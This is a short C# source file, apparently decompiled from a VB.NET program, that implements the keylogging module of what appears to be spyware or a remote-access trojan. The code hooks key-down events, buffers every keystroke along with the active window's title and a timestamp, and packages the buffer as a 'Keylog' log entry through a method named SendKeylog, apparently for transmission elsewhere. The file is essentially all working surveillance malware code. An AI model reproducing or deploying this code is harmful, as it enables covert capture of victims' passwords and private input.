using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class KeyloggerHandler
{
	[AccessedThroughProperty("keylogger")]
	private static KeyLogger _keylogger;

	private static StringBuilder tempKeyLog;

	private static KeyLogger keylogger
	{
		get
		{
			return _keylogger;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			KeyLogger.KeyDownEventHandler value2 = keylogger_KeyDown;
			if (_keylogger != null)
			{
				_keylogger.KeyDown -= value2;
			}
			_keylogger = value;
			if (_keylogger != null)
			{
				_keylogger.KeyDown += value2;
			}
		}
	}

	public static void InitializeKeylogger()
	{
		keylogger = new KeyLogger();
		tempKeyLog = new StringBuilder();
		keylogger.Start();
	}

	public static Logs.Log SendKeylog()
	{
		string data = string.Empty;
		if (tempKeyLog.Length > 1)
		{
			data = tempKeyLog.ToString();
			tempKeyLog.Remove(0, tempKeyLog.Length);
		}
		keylogger.ResetTitle();
		return new Logs.Log(Logs.LogType.Keylog, data);
	}

	private static void keylogger_KeyDown(object sender, KeyLogger.KeyEventArgs e)
	{
		if (e.Window.Changed)
		{
			tempKeyLog.AppendLine();
			tempKeyLog.AppendLine($"[{e.Window.Name} - {e.DateTime.ToShortTimeString()}]");
		}
		tempKeyLog.Append(e.StringKey);
	}
}
